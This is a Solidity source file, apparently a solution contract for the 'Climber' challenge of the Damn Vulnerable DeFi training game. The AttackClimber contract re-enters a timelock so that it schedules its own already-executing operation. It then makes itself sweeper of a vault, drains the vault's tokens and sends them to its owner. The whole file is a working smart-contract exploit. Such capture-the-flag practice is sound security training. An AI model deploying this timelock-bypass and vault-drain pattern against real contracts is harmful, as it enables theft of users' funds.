// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

import {AttackVault} from "./AttackVault.sol";
import {DamnValuableToken} from "../DamnValuableToken.sol";
import {ClimberTimelock} from "../climber/ClimberTimelock.sol";

contract AttackClimber {
    address _owner;

    address _vault;
    address payable _timelock;
    address _token;
    bytes[] private _data;
    address[] private _users;

    constructor(address vault, address payable timelock, address token, address owner) {
        _vault = vault;
        _timelock = timelock;
        _token = token;
        _owner = owner;
    }

    function setScheduleData(address[] memory users, bytes[] memory data) external {
        require(msg.sender == _owner, "not owner");

        _users = users;
        _data = data;
    }

    function attack() external {
        require(msg.sender == _timelock, "not timelock");

        uint256[] memory amounts = new uint256[](_users.length);
        ClimberTimelock(_timelock).schedule(_users, amounts, _data, 0);

        AttackVault(_vault)._setSweeper(address(this));
        AttackVault(_vault).sweepFunds(_token);
    }

    function withdraw() external {
        require(msg.sender == _owner, "not owner");

        DamnValuableToken(_token).transfer(_owner, DamnValuableToken(_token).balanceOf(address(this)));
    }
}
